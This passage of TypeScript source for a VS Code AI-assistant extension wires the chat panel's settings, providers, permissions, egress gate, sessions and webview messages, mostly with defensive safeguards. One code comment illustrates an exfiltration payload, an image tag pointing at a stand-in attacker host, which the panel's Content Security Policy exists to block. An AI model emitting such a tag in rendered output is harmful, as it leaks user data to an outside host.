// The panel's other half: everything the sidebar can do, minus the pixels.
//
// This is where the pieces meet — settings choose the provider, the mode chooses the tools, the
// router decides whether the question is worth escalating, the egress gate decides what may leave,
// the permission book decides what may run, and the session decides what the model is allowed to
// remember. Each of those lives somewhere else and is tested there; this file is the wiring, and
// it is deliberately the only place that knows about all of them.

import * as vscode from "vscode";
import { language, t } from "../shared/i18n.js";
import { runTurn, type Tool } from "../core/agent/loop.js";
import { Permissions, commandPrefix, type PermissionStore, type Rule } from "../core/agent/permissions.js";
import { costOf, makeLookup, type Price } from "../core/router/pricing.js";
import { route } from "../core/router/route.js";
import { Session, type ContextItem, type Entry, type SessionData } from "../core/session/session.js";
import { filterHistory, searchTranscript, upsertSession } from "../core/session/history.js";
import { compactBrief, digestEntries, sessionAsContext, shouldSuggestCompact } from "../core/session/digest.js";
import {
  ALWAYS_ON,
  BUILTIN_SKILLS,
  detectGroups,
  isSkillEnabled,
  normaliseGroups,
  SKILL_GROUPS,
  skillInvocation,
  toggleSkill,
  type SkillGroup,
} from "../core/session/skills.js";
import { capture, describeRestore, trimCheckpoints } from "../core/session/checkpoint.js";
import type { Plan } from "../core/agent/plan.js";
import { promptForMode, toolsForMode } from "../core/session/modes.js";
import { detectIbmiLanguage, ibmiPrompt } from "../core/ibmi/languages.js";
import { parsePrompt, participantDirective, type MentionKind, type Participant } from "../core/session/mentions.js";
import { resolveMentions } from "./mentions.js";
import { instructionFiles, instructionsPrompt } from "./instructions.js";
import { buildDefinitionTools, DefinitionStore, type SubAgentRun } from "./definitions.js";
import { skillsPrompt } from "../core/agent/definitions.js";
import { autoApprove } from "../core/agent/autoApprove.js";
import { matchGlob } from "../core/util/glob.js";
import { discoverLocal, rankModels, suggestPull } from "../core/providers/discover.js";
import { request } from "../core/util/http.js";
import { estimateTokens } from "../core/util/tokens.js";
import { isLocalEndpoint, Vault } from "../core/redaction/index.js";
import type {
  Mode,
  Reasoning,
  Screen,
  ToExtension,
  ToPanel,
  UiEntry,
  UiHistoryFilter,
  UiModel,
  UiPermissionRule,
  UiActiveEditor,
  UiSetup,
  UiSkill,
  PolicyList,
  UiSkillGroup,
  UiWizard,
  UiState,
} from "../shared/protocol.js";
import { SECTION, endpointFor, providerFor, readSettings, routerConfig, type Keys, type Settings, writeTarget } from "./config.js";
import { EgressGate, safeHost } from "./egress.js";
import { labelFor, listModels, openFiles, openFileUris, supportsReasoning } from "./models.js";
import { loadPrices } from "./prices.js";
import { buildTools } from "./tools.js";
import { McpManager } from "./integrations/mcp.js";
import { WorkspaceContext, relative } from "./workspace.js";

const HISTORY_KEY = "hiveyCode.sessions";
const PERMISSIONS_KEY = "hiveyCode.permissions";
/** Set once the user has been through the first-run screen, or dismissed it. */
const SETUP_SEEN_KEY = "hiveyCode.setupSeen";

/**
 * The only addresses `openExternal` will open.
 *
 * The panel renders model output, so a message arriving from it is not automatically a message the
 * user meant to send. An allow-list costs one line and removes the whole question.
 */
const ALLOWED_LINKS = [
  "https://openrouter.ai/keys",
  "https://console.anthropic.com/settings/keys",
  "https://learn.microsoft.com/azure/ai-services/openai/quickstart",
  "https://ollama.com/download",
];

const PREFS_KEY = "hiveyCode.prefs";
const HISTORY_MAX = 100;

interface Prefs {
  mode: Mode;
  reasoning: Reasoning;
}

class MementoPermissionStore implements PermissionStore {
  constructor(private readonly memento: vscode.Memento) {}
  read(): Rule[] {
    return this.memento.get<Rule[]>(PERMISSIONS_KEY, []);
  }
  write(rules: Rule[]): void {
    void this.memento.update(PERMISSIONS_KEY, rules);
  }
}

export class ChatViewProvider implements vscode.WebviewViewProvider {
  public static readonly viewId = "hiveyCode.chat";
  /** The same panel, declared a second time so it can live in the right-hand bar as well. */
  public static readonly sideViewId = "hiveyCode.chatSide";

  private view?: vscode.WebviewView;
  /** Every resolved copy of the panel. There are two: the activity bar's and the right-hand bar's. */
  private readonly views = new Set<vscode.WebviewView>();
  private session = new Session();
  private attachments: ContextItem[] = [];
  private turn?: AbortController;
  private screen: Screen = "chat";
  private searchQuery = "";
  private models: UiModel[] = [];
  private modelsLoading = false;
  private historyFilter: UiHistoryFilter = { query: "", period: "all", mode: "all", paidOnly: false, sort: "updated" };
  private readonly approvals = new Map<string, (answer: "once" | "session" | "always" | "no") => void>();
  private readonly priceLookup = makeLookup(loadPrices());
  private readonly permissions: Permissions;

  constructor(
    private readonly ctx: vscode.ExtensionContext,
    private readonly keys: Keys,
    private readonly workspace: WorkspaceContext,
    private readonly gate: EgressGate,
    private readonly log: vscode.OutputChannel,
    private readonly mcp: McpManager,
    private readonly definitions: DefinitionStore,
  ) {
    this.permissions = new Permissions(new MementoPermissionStore(ctx.globalState));
    // The gate asks through the panel, in the conversation, rather than through a modal over the
    // editor. If the panel is not open there is nobody to ask, and the gate refuses — which is the
    // right way round for a question about what leaves the machine.
    this.gate.ask = (request) => this.askEgress(request);
    const prefs = ctx.globalState.get<Prefs>(PREFS_KEY);
    this.session.mode = prefs?.mode ?? "agent";
    this.reasoning = prefs?.reasoning ?? "none";
  }

  /**
   * Knock on the ports local runtimes bind, and report what answered.
   *
   * Loopback only, and nothing but a request for a model list — a probe that reaches something
   * unexpected has disclosed nothing except that a VS Code extension asked.
   */
  private async probeLocal(): Promise<void> {
    this.setup = { ...this.setup, probing: true };
    this.sendState();
    const settings = readSettings();
    // Whatever is already configured is probed too, so a custom address is confirmed rather than
    // ignored — and so someone who is already set up sees their own server in the list.
    const extra = [
      ...(settings.endpoints.local ? [{ name: t("Configured endpoint"), baseUrl: settings.endpoints.local }] : []),
      // Servers the user declared. They cannot be discovered — finding a GPU box on the office
      // network would mean scanning it, which this extension will not do — so being probed is the
      // whole point of having been declared.
      ...settings.servers.map((x) => ({ name: x.name, baseUrl: x.url })),
    ];
    const found = await discoverLocal({
      extra,
      fetchJson: async (url, timeoutMs) => {
        const res = await request(url, { timeoutMs, label: "discovery" });
        if (!res.ok) throw new Error(String(res.status));
        return res.json();
      },
    });
    this.setup = {
      ...this.setup,
      probing: false,
      runtimes: found.map((r) => ({
        name: r.name,
        baseUrl: r.baseUrl,
        models: rankModels(r.models),
        ...(r.models.length ? {} : { suggestion: suggestPull(r.name) }),
      })),
    };
    await this.refreshSetup();
  }

  /** Re-read what is configured and which keys exist, without touching the probe results. */
  private async refreshSetup(): Promise<void> {
    const settings = readSettings();
    const providers = ["openrouter", "anthropic", "openai-compatible"] as const;
    const hasKey: Record<string, boolean> = {};
    for (const p of providers) hasKey[p] = Boolean(await this.keys.get(p));
    this.setup = {
      ...this.setup,
      hasKey,
      endpoints: { ...settings.endpoints },
      configured: {
        provider: settings.chat.provider,
        model: settings.chat.model,
        baseUrl: settings.endpoints[settings.chat.provider] ?? "",
      },
    };
    this.sendState();
  }

  private reasoning: Reasoning = "none";

  /** What the first-run screen knows. Rebuilt by a probe, never persisted — it goes stale. */
  private setup: UiSetup = { probing: false, runtimes: [], hasKey: {}, endpoints: {} };

  resolveWebviewView(view: vscode.WebviewView): void {
    this.view = view;
    this.views.add(view);
    view.onDidDispose(() => {
      this.views.delete(view);
      if (this.view === view) this.view = [...this.views][0];
    });
    // Whichever one the user brings forward becomes the one commands act on. Without this, opening
    // the right-hand copy would leave `openSearch` and friends talking to the hidden left one.
    view.onDidChangeVisibility(() => {
      if (view.visible) this.view = view;
    });
    view.webview.options = {
      enableScripts: true,
      localResourceRoots: [vscode.Uri.joinPath(this.ctx.extensionUri, "media")],
    };
    view.webview.html = this.html(view.webview);
    view.webview.onDidReceiveMessage((m: ToExtension) => void this.onMessage(m));
    // The list of open editors is part of the UI, so it has to follow the editor.
    const refresh = () => this.screen === "chat" && this.sendState();
    this.ctx.subscriptions.push(
      vscode.window.onDidChangeActiveTextEditor(refresh),
      // The menu distinguishes "the selection" from "the whole file", so it has to know whether
      // there IS a selection. Without this the labels lag a click behind the editor.
      vscode.window.onDidChangeTextEditorSelection(refresh),
      vscode.workspace.onDidOpenTextDocument(refresh),
      vscode.workspace.onDidCloseTextDocument(refresh),
    );
  }

  // ── UI plumbing ────────────────────────────────────────────────────────────────────────────

  /**
   * Send to every copy of the panel.
   *
   * The extension holds the state; the panels only draw it. Posting to one and not the other would
   * let the hidden copy drift, and it is not hidden for long — the whole point of declaring it
   * twice is that the user moves between them.
   */
  private post(message: ToPanel): void {
    for (const view of this.views) void view.webview.postMessage(message);
  }

  private html(webview: vscode.Webview): string {
    const nonce = randomNonce();
    const uri = (f: string) => webview.asWebviewUri(vscode.Uri.joinPath(this.ctx.extensionUri, "media", f));
    // No remote origin is allowed: the panel loads its own script and its own stylesheet, and a
    // model that emits an <img src="http://attacker/?data"> cannot phone home from here.
    const csp = [
      `default-src 'none'`,
      `img-src ${webview.cspSource} data:`,
      `style-src ${webview.cspSource}`,
      `font-src ${webview.cspSource}`,
      `script-src 'nonce-${nonce}'`,
    ].join("; ");
    return `<!DOCTYPE html>
<html lang="${language()}">
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${csp}">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="${uri("style.css")}">
<title>Hivey Code</title>
</head>
<!-- The floor below which the panel scrolls sideways instead of rearranging itself. Dragging the
     side bar narrow otherwise reflows every toolbar, and a layout that moves while you resize is a
     layout nobody trusts. Set through a style attribute rather than the stylesheet because the
     value is a setting, and the stylesheet is static. -->
<body style="min-width:${Math.max(0, Math.round(readSettings().panel.minWidth))}px">
<div id="app"></div>
<script nonce="${nonce}" src="${uri("webview.js")}"></script>
</body>
</html>`;
  }

  private uiEntry(e: Entry): UiEntry {
    return {
      id: e.id,
      role: e.role,
      text: e.text,
      at: e.at,
      included: e.included,
      pinned: e.pinned,
      error: e.error,
      model: e.model,
      usdCost: e.usdCost,
      ...(e.checkpoint?.length ? { checkpointFiles: e.checkpoint.length } : {}),
      ...(e.checkpointPartial ? { checkpointPartial: true } : {}),
      ...(e.plan ? { plan: e.plan } : {}),
      // An assistant entry carries the id of the question it answered, when that question has a
      // checkpoint. The rule is then drawn under the ANSWER as well as above the question: the
      // answer is where the reader is when they decide the whole thing was the wrong direction,
      // and asking them to scroll up to the request to undo it is asking them to look for it.
      ...this.restoreTarget(e),
      reasoning: e.reasoning,
      steps: e.steps,
      context: e.context?.map((c) => ({ kind: c.kind, label: c.label, tokens: estimateTokens(c.body) })),
    };
  }

  private sendState(): void {
    const s = readSettings();
    const baseUrl = safeUrl(s, s.chat.provider);
    const stored = this.history();
    // What the editor is showing, offered rather than required. Recomputed on every state send
    // because it follows the active tab; the block list applies, so a file the policy excludes
    // simply does not appear.
    const implicit = this.workspace.activeContext(3000, s);
    const contextTokens = this.session.entries
      .filter((e) => e.included)
      .reduce((sum, e) => sum + estimateTokens(e.text) + (e.context ?? []).reduce((a, c) => a + estimateTokens(c.body), 0), 0);
    const budgetTokens = s.context.maxTokens;

    const state: UiState = {
      screen: this.screen,
      session: {
        id: this.session.id,
        title: this.session.title,
        mode: this.session.mode,
        entries: this.session.entries.map((e) => this.uiEntry(e)),
      },
      mode: this.session.mode,
      reasoning: this.reasoning,
      reasoningAvailable: supportsReasoning(s.chat.model),
      model: s.chat.model,
      modelLabel: this.models.length ? labelFor(this.models, s.chat.model) : s.chat.model,
      provider: s.chat.provider,
      remote: !isLocalEndpoint(baseUrl),
      contextTokens,
      contextFill: budgetTokens > 0 ? Math.min(1, contextTokens / budgetTokens) : 0,
      // Computed here rather than in the panel because the budget is a setting, and a panel that
      // guessed at it would offer to summarise a conversation that fits comfortably.
      suggestCompact: shouldSuggestCompact(
        contextTokens,
        budgetTokens,
        this.session.entries.filter((e) => e.included).length,
      ),
      budget: { spentTodayUsd: this.gate.budget.spentToday(), dailyUsd: s.budget.dailyUsd },
      sessionCostUsd: this.session.totalCostUsd(),
      skills: this.uiSkills(),
      skillGroups: this.uiSkillGroups(),
      ...(this.wizard ? { wizard: this.uiWizard() } : {}),
      // Unfiltered, and short. The `+` menu needs "the last few conversations", not "the ones that
      // pass whatever filter is set on a screen the user may not even have open".
      recent: stored
        .slice()
        .sort((a, b) => b.updatedAt - a.updatedAt)
        .slice(0, 10)
        .map((x) => ({ id: x.id, title: x.title, messages: x.entries.length })),
      attachments: this.attachments.map((c) => ({ kind: c.kind, label: c.label, tokens: estimateTokens(c.body) })),
      ...(implicit ? { implicit: { kind: implicit.kind, label: implicit.label, tokens: estimateTokens(implicit.body) } } : {}),
      implicitOn: Boolean(implicit) && this.implicitDismissed !== implicit?.label,
      openFiles: openFiles(),
      ...(activeEditor() ? { activeEditor: activeEditor()! } : {}),
      history: filterHistory(stored, this.historyFilter),
      historyFilter: this.historyFilter,
      models: this.models,
      modelsLoading: this.modelsLoading,
      permissions: this.uiPermissions(),
      matches: searchTranscript(this.session.toJSON(), this.searchQuery).map((m) => m.entryId),
      searchQuery: this.searchQuery,
      setup: this.setup,
      policy: {
        scope: readSettings().permissions.autoApprove,
        allowedPaths: readSettings().permissions.allowedPaths,
        allowedCommands: readSettings().permissions.allowedCommands,
        deniedPaths: readSettings().permissions.deniedPaths,
        deniedCommands: readSettings().permissions.deniedCommands,
      },
    };
    this.post({ type: "state", state });
  }

  private uiPermissions(): UiPermissionRule[] {
    // Session grants never reach the store, but the type allows them; filter rather than cast.
    const stored: UiPermissionRule[] = this.permissions
      .rules()
      .filter((r): r is Rule & { level: "always" | "never" } => r.level !== "session")
      .map((r) => ({ tool: r.tool, ...(r.prefix ? { prefix: r.prefix } : {}), level: r.level }));
    const session: UiPermissionRule[] = this.permissions.sessionRules().map((key) => {
      const [tool, prefix] = key.split(":");
      return { tool: tool ?? key, ...(prefix ? { prefix } : {}), level: "always" as const, session: true };
    });
    return [...stored, ...session];
  }

  // ── Sessions ───────────────────────────────────────────────────────────────────────────────

  private history(): SessionData[] {
    return this.ctx.workspaceState.get<SessionData[]>(HISTORY_KEY, []);
  }

  private persist(): void {
    // No early return on an empty session: emptying a conversation has to REMOVE it, not skip the
    // write and leave the previous version — with the messages the user just deleted — in storage.
    const all = upsertSession(this.history(), this.session.toJSON(), HISTORY_MAX);
    void this.ctx.workspaceState.update(HISTORY_KEY, all);
  }

  private savePrefs(): void {
    void this.ctx.globalState.update(PREFS_KEY, { mode: this.session.mode, reasoning: this.reasoning } satisfies Prefs);
  }

  /** Rebuild the panel after a change it cannot re-render on its own, such as the language. */
  reload(): void {
    for (const view of this.views) view.webview.html = this.html(view.webview);
  }

  /**
   * Bring the panel forward — and only if it is not already there.
   *
   * Two mistakes lived here, and they were the same mistake. `hiveyCode.chat.focus` names the
   * ACTIVITY-BAR copy specifically, so every command that needed the panel dragged the user back to
   * the left sidebar: pressing History in the right-hand panel opened the left one and moved the
   * conversation there, and so did the model picker, the search, the setup screen and every editor
   * command. The panel exists in two places on purpose; a command that always reveals one of them
   * makes the other decorative.
   *
   * So: if a copy is on screen, nothing happens at all — the user is already looking at the thing
   * being opened, and revealing it can only move it somewhere they did not ask for. Otherwise the
   * one they used last is revealed, falling back to the activity bar for a first run.
   */
  private async focus(): Promise<void> {
    for (const view of this.views) if (view.visible) return;
    const id = this.view?.viewType ?? ChatViewProvider.viewId;
    await vscode.commands.executeCommand(`${id}.focus`);
  }

  /** Open the panel on a given screen — used by the palette commands and by the tests. */
  async show(screen: Screen): Promise<void> {
    await this.focus();
    this.screen = screen;
    this.sendState();
    if (screen === "models" && !this.models.length) void this.loadModels();
  }

  newSession(): void {
    this.wizard = undefined;
    this.persist();
    const mode = this.session.mode;
    this.session = new Session();
    this.session.mode = mode;
    this.attachments = [];
    this.screen = "chat";
    this.searchQuery = "";
    // A new conversation starts cautious again: session-wide permissions do not carry over.
    this.permissions.clearSession();
    this.sendState();
  }

  async focusWithPrompt(text: string, context?: ContextItem): Promise<void> {
    await this.focus();
    this.screen = "chat";
    if (context) this.attachments.push(context);
    this.sendState();
    await this.ask(text);
  }

  // ── Messages from the panel ────────────────────────────────────────────────────────────────

  private async onMessage(m: ToExtension): Promise<void> {
    try {
      switch (m.type) {
        case "ready":
          this.sendState();
          void this.loadModels();
          void this.refreshSkills();
          // First run: open on the setup screen rather than on a chat that cannot answer. The
          // probe starts immediately, because the useful version of this screen is the one that
          // already knows what is running by the time it is read.
          if (!this.ctx.globalState.get<boolean>(SETUP_SEEN_KEY) || (await this.cannotAnswer())) {
            this.screen = "setup";
            await this.refreshSetup();
            void this.probeLocal();
          }
          break;
        case "send":
          await this.ask(m.text);
          break;
        case "stop":
          this.turn?.abort();
          break;
        case "renameSession":
          // An empty name hands the title back to the assistant's guess rather than leaving the
          // conversation nameless, which is what someone clearing the field is asking for.
          this.session.title = m.title;
          this.persist();
          this.sendState();
          break;

        case "newSession":
          this.newSession();
          break;
        case "openScreen":
          this.screen = m.screen;
          this.sendState();
          if (m.screen === "models" && !this.models.length) void this.loadModels();
          break;
        case "openSession": {
          // Leaving cancels the guided start. It was setting up THIS conversation; carried into
          // another one it would go on asking questions about a conversation that already exists,
          // and its answers would land on the wrong session.
          this.wizard = undefined;
          this.persist();
          const found = this.history().find((s) => s.id === m.id);
          if (found) this.session = new Session(found);
          this.screen = "chat";
          this.searchQuery = "";
          this.sendState();
          break;
        }
        case "useSessionAsContext": {
          const found = this.history().find((x) => x.id === m.id);
          if (!found) break;
          const item = sessionAsContext(found, {
            you: t("You"),
            assistant: "Hivey Code",
            // A quarter of the turn's budget. An attachment that can fill the context is not an
            // attachment, it is a replacement for the conversation it was added to.
            maxTokens: Math.floor(readSettings().context.maxTokens * 0.25),
            omittedNote: (n) => t("({0} earlier exchanges omitted.)", n),
            label: (title) => t("conversation: {0}", title || t("untitled")),
          });
          if (!item.body.trim()) {
            void vscode.window.showInformationMessage(t("That conversation has nothing left to attach."));
            break;
          }
          // Carrying a conversation into a fresh one: the current transcript is saved first, then
          // left. Without the save, the turn that prompted this would be lost.
          if (m.into === "new") {
            this.persist();
            this.newSession();
          }
          // Replaces any earlier attachment of the same conversation rather than stacking a second
          // copy: pressing the button twice is a thing people do when nothing visibly happened.
          this.attachments = this.attachments.filter((a) => a.label !== item.label);
          this.attachments.push(item);
          this.screen = "chat";
          this.sendState();
          break;
        }
        case "compact":
          await this.compact();
          break;
        case "startWizard":
          // A fresh conversation first: the guided start is about the one being created, and
          // running it over a conversation in progress would change the rules half way through.
          this.newSession();
          this.wizard = { step: "mode", families: [] };
          this.sendState();
          break;

        case "wizardAnswer": {
          if (!this.wizard) break;
          const config = vscode.workspace.getConfiguration(SECTION);
          if (m.step === "mode") {
            this.wizard.mode = m.value[0] as Mode;
            this.session.mode = this.wizard.mode;
            this.savePrefs();
            this.wizard.step = "family";
          } else if (m.step === "family") {
            this.wizard.families = m.value as SkillGroup[];
            await config.update(
              "skills.groups",
              normaliseGroups(this.wizard.families),
              vscode.ConfigurationTarget.Global,
            );
            this.wizard.step = "skills";
          } else {
            // The skills step sends what is TICKED. Everything offered and not ticked is switched
            // off — which is only correct because the offer was limited to the chosen families.
            const on = new Set(m.value);
            const offered = BUILTIN_SKILLS.filter(
              (sk) => normaliseGroups(this.wizard!.families).includes(sk.group) && !ALWAYS_ON.has(sk.name),
            );
            let disabled = readSettings().skills.disabled;
            for (const sk of offered) disabled = toggleSkill(disabled, sk.name, on.has(sk.name));
            await config.update("skills.disabled", disabled, vscode.ConfigurationTarget.Global);
            this.wizard.step = "ready";
          }
          this.sendState();
          break;
        }

        case "wizardBack":
          if (!this.wizard) break;
          this.wizard.step =
            this.wizard.step === "ready" ? "skills" : this.wizard.step === "skills" ? "family" : "mode";
          this.sendState();
          break;

        case "wizardCancel":
          this.wizard = undefined;
          this.sendState();
          break;

        case "setSkillGroups": {
          const config = vscode.workspace.getConfiguration(SECTION);
          // One write, not one per skill: choosing "Web and SQL" is a single decision, and a
          // settings file that churned forty times while the user clicked chips would be a settings
          // file that fights its own change listener.
          // The families, not the individual skills. Choosing "Rust" must not also undo the four
          // skills you had switched off inside Python last week: the two lists answer different
          // questions and are stored separately for that reason.
          await config.update(
            "skills.groups",
            normaliseGroups(m.groups as SkillGroup[]),
            vscode.ConfigurationTarget.Global,
          );
          this.sendState();
          break;
        }
        case "setSkillEnabled": {
          const config = vscode.workspace.getConfiguration(SECTION);
          const next = toggleSkill(readSettings().skills.disabled, m.name, m.enabled);
          // Global rather than workspace: which skills a person wants offered is a preference about
          // them, not about the repository they happen to have open. And `writeTarget()` would put
          // it in the workspace when one exists, so someone switching a skill off would find it
          // back on in the next project.
          await config.update("skills.disabled", next, vscode.ConfigurationTarget.Global);
          this.sendState();
          break;
        }
        case "openSkill": {
          const folder = vscode.workspace.workspaceFolders?.[0];
          if (!folder) break;
          await vscode.window.showTextDocument(vscode.Uri.joinPath(folder.uri, m.source));
          break;
        }
        case "shareSkills":
          await this.shareSkills();
          break;
        case "newSkill":
          await vscode.commands.executeCommand("hiveyCode.newSkill");
          break;
        case "openContextPicker":
          await this.contextPicker();
          break;
        case "openToolsPicker":
          await this.toolsPicker();
          break;
        case "setProvider": {
          const config = vscode.workspace.getConfiguration(SECTION);
          await config.update("chat.provider", m.provider, writeTarget());
          await this.refreshSetup();
          void this.loadModels(true);
          this.sendState();
          break;
        }
        case "restoreCheckpoint":
          await this.restoreCheckpoint(m.id);
          break;
        case "shareEntry":
          await this.shareEntry(m.id);
          break;
        case "deleteSession": {
          const rest = this.history().filter((s) => s.id !== m.id);
          await this.ctx.workspaceState.update(HISTORY_KEY, rest);
          if (this.session.id === m.id) this.session = new Session();
          this.sendState();
          break;
        }
        case "setMode":
          this.session.mode = m.mode;
          this.savePrefs();
          this.sendState();
          break;
        case "setReasoning":
          this.reasoning = m.reasoning;
          this.savePrefs();
          this.sendState();
          break;
        case "setModel": {
          const config = vscode.workspace.getConfiguration(SECTION);
          await config.update("chat.model", m.model, writeTarget());
          if (m.provider && m.provider !== readSettings().chat.provider) {
            await config.update("chat.provider", m.provider, writeTarget());
          }
          // A model served by a machine other than the configured one brings its address with it.
          // Without this, picking a model from a second runtime selected a name the configured
          // server has never heard of, and the failure arrived a question later.
          if (m.baseUrl && m.provider === "local" && m.baseUrl !== readSettings().endpoints.local) {
            await config.update("endpoints.local", m.baseUrl, writeTarget());
          }
          this.models = this.models.map((x) => ({ ...x, current: x.id === m.model }));
          this.screen = "chat";
          this.sendState();
          break;
        }
        case "refreshModels":
          await this.loadModels(true);
          break;
        case "setHistoryFilter":
          this.historyFilter = { ...this.historyFilter, ...m.filter };
          this.sendState();
          break;
        case "search":
          this.searchQuery = m.query;
          this.sendState();
          break;
        case "setIncluded":
          this.session.setIncluded(m.id, m.included);
          this.persist();
          this.sendState();
          break;
        case "setPinned":
          this.session.setPinned(m.id, m.pinned);
          this.persist();
          this.sendState();
          break;
        case "dropEntry":
          this.session.drop(m.id);
          this.persist();
          this.sendState();
          break;
        case "editEntry":
          this.session.editUserEntry(m.id, m.text);
          this.sendState();
          await this.runTurn();
          break;
        case "retry":
          this.session.dropLastAnswer();
          this.sendState();
          await this.runTurn();
          break;
        case "attach":
          await this.attach(m.what);
          break;
        case "attachPath": {
          // A path that is already absolute is used as it stands. `asRelativePath` returns the
          // absolute path for anything outside the workspace, so joining it onto the folder — which
          // is what this did unconditionally — produced a URI pointing nowhere, and the attachment
          // silently did not happen.
          const folder = vscode.workspace.workspaceFolders?.[0];
          const absolute = /^([/\\]|[A-Za-z]:)/.test(m.path);
          const uri = absolute || !folder ? vscode.Uri.file(m.path) : vscode.Uri.joinPath(folder.uri, m.path);
          const item = await this.workspace.fileContext(uri, readSettings());
          if (item) {
            this.attachments.push(item);
            this.remember(m.path);
          } else {
            void vscode.window.showWarningMessage(t("{0} could not be attached.", m.path));
          }
          this.sendState();
          break;
        }
        case "setImplicit":
          // Remembered by LABEL rather than as a flag. Dismissing means "not this file", and the
          // suggestion should come back when a different file is opened — which is what the editor's
          // own chat does, and what stops a single dismissal switching the feature off for ever.
          this.implicitDismissed = m.on ? undefined : this.workspace.activeContext(3000, readSettings())?.label;
          this.sendState();
          break;
        case "removeAttachment":
          this.attachments = this.attachments.filter((a) => a.label !== m.label);
          this.sendState();
          break;
        case "setPermission":
          this.permissions.remember(
            m.tool,
            m.prefix ? { command: m.prefix } : {},
            m.level,
            !m.prefix,
          );
          this.sendState();
          break;
        case "forgetPermission":
          this.permissions.forget(m.tool, m.prefix);
          this.sendState();
          break;
        case "addPolicyEntry": {
          const paths = m.list.endsWith("Paths");
          const value = await vscode.window.showInputBox({
            prompt: paths
              ? t("A path or a glob, relative to the workspace — “src/generated/**”")
              : t("The start of a command — “npm test”"),
            placeHolder: paths ? "src/generated/**" : "npm test",
            ignoreFocusOut: true,
            validateInput: (text) => (text.trim() ? undefined : t("Empty.")),
          });
          if (!value?.trim()) break;
          await this.updatePolicyList(m.list, (list) => [...new Set([...list, value.trim()])].sort());
          break;
        }

        case "removePolicyEntry":
          await this.updatePolicyList(m.list, (list) => list.filter((x) => x !== m.value));
          break;

        case "setApprovalScope": {
          const config = vscode.workspace.getConfiguration(SECTION);
          // Turning approvals off entirely is worth one confirmation. Not a moral objection — it is
          // a legitimate choice on a scratch repository — but it is the one setting whose cost is
          // not visible from its label until something has already happened.
          if (m.scope === "all") {
            const proceed = t("Switch approvals off");
            const answer = await vscode.window.showWarningMessage(
              t("Let the agent write anywhere and run anything, without asking?"),
              {
                modal: true,
                detail: t(
                  "Files excluded by the privacy policy stay excluded, and what leaves the machine is still governed separately. Everything else runs unattended.",
                ),
              },
              proceed,
            );
            if (answer !== proceed) break;
          }
          await config.update("permissions.autoApprove", m.scope, writeTarget());
          this.sendState();
          break;
        }

        case "clearSessionPermissions":
          this.permissions.clearSession();
          this.sendState();
          break;
        case "openEgress":
          await vscode.commands.executeCommand("hiveyCode.showEgress");
          break;
        case "openCosts":
          await vscode.commands.executeCommand("hiveyCode.showCosts");
          break;
        case "probeLocal":
          await this.probeLocal();
          break;

        case "saveKey": {
          const provider = m.provider as Parameters<Keys["store"]>[0];
          await this.keys.store(provider, m.key);
          // Storing a key is only half the intent: someone who pastes an OpenRouter key wants to
          // use OpenRouter, and leaving the provider on `local` would make the key look ignored.
          const config = vscode.workspace.getConfiguration(SECTION);
          await config.update("chat.provider", provider, vscode.ConfigurationTarget.Global);
          await this.refreshSetup();
          void this.loadModels(true);
          break;
        }

        case "clearKey": {
          await this.keys.delete(m.provider as Parameters<Keys["delete"]>[0]);
          await this.refreshSetup();
          break;
        }

        case "addServer": {
          const url = m.url.trim();
          // Rejected here rather than stored and failed later: an address that is not an address
          // would sit in the settings looking configured and probe nothing for ever.
          if (!/^https?:\/\//i.test(url)) {
            void vscode.window.showWarningMessage(t("A server address starts with http:// or https://."));
            break;
          }
          const config = vscode.workspace.getConfiguration(SECTION);
          const existing = readSettings().servers;
          if (!existing.some((x) => x.url === url)) {
            await config.update(
              "endpoints.servers",
              [...existing, { name: m.name || url, url }],
              vscode.ConfigurationTarget.Global,
            );
          }
          await this.probeLocal();
          void this.loadModels(true);
          break;
        }

        case "setEndpoint": {
          const config = vscode.workspace.getConfiguration(SECTION);
          // The manifest spells this one differently from the provider id, because `openai-compatible`
          // is not a legal settings key segment.
          const key = m.provider === "openai-compatible" ? "endpoints.openaiCompatible" : `endpoints.${m.provider}`;
          await config.update(key, m.url, vscode.ConfigurationTarget.Global);
          await this.refreshSetup();
          break;
        }

        case "useLocal": {
          const config = vscode.workspace.getConfiguration(SECTION);
          await config.update("endpoints.local", m.baseUrl, vscode.ConfigurationTarget.Global);
          await config.update("chat.provider", "local", vscode.ConfigurationTarget.Global);
          await config.update("chat.model", m.model, vscode.ConfigurationTarget.Global);
          // Completion runs on the same machine by default: a user who has just chosen a local
          // model has not also chosen to leave completion pointing somewhere else.
          await config.update("completion.provider", "local", vscode.ConfigurationTarget.Global);
          await config.update("completion.model", m.model, vscode.ConfigurationTarget.Global);
          await this.refreshSetup();
          break;
        }

        case "finishSetup":
          await this.ctx.globalState.update(SETUP_SEEN_KEY, true);
          this.screen = "chat";
          this.sendState();
          break;

        case "openExternal":
          // Only the addresses this extension itself offers. A URL arriving from the panel is
          // still a URL the panel could have been made to send.
          if (ALLOWED_LINKS.includes(m.url)) await vscode.env.openExternal(vscode.Uri.parse(m.url));
          break;

        case "openSettings":
          await vscode.commands.executeCommand("workbench.action.openSettings", SECTION);
          break;
        case "approve": {
          const resolve = this.approvals.get(m.id);
          this.approvals.delete(m.id);
          resolve?.(m.answer);
          break;
        }
        case "insertCode": {
          const ed = vscode.window.activeTextEditor;
          if (!ed) {
            void vscode.window.showWarningMessage(t("No active editor to insert this code into."));
            break;
          }
          // Two different intentions, and conflating them destroyed work: with a selection active,
          // "insert" replaced it, which is right when that is what you meant and a silent deletion
          // when it is not. `atCursor` puts the code in at the caret and touches nothing else.
          await ed.edit((b) => (m.atCursor ? b.insert(ed.selection.active, m.code) : b.replace(ed.selection, m.code)));
          // The caret ends after what was inserted, where typing continues — and the editor scrolls
          // to it, so the code lands somewhere the user can see.
          ed.revealRange(new vscode.Range(ed.selection.active, ed.selection.active));
          break;
        }
        case "applyCode": {
          // t("Apply") opens the block as a diff against the active file, so the user reviews it
          // in the editor's own diff view rather than trusting a button.
          const ed = vscode.window.activeTextEditor;
          if (!ed) {
            void vscode.window.showWarningMessage(t("Open the target file before applying."));
            break;
          }
          const preview = ed.document.uri.with({ scheme: "hivey-code-preview", query: String(Date.now()) });
          previewContents.set(preview.toString(), m.code);
          await vscode.commands.executeCommand("vscode.diff", ed.document.uri, preview, t("{0} ↔ proposal", relative(ed.document.uri)));
          break;
        }
        case "copy":
          await vscode.env.clipboard.writeText(m.text);
          break;
      }
    } catch (err) {
      this.post({ type: "error", message: (err as Error).message });
      this.log.appendLine(`[chat] ${(err as Error).stack ?? (err as Error).message}`);
    }
  }

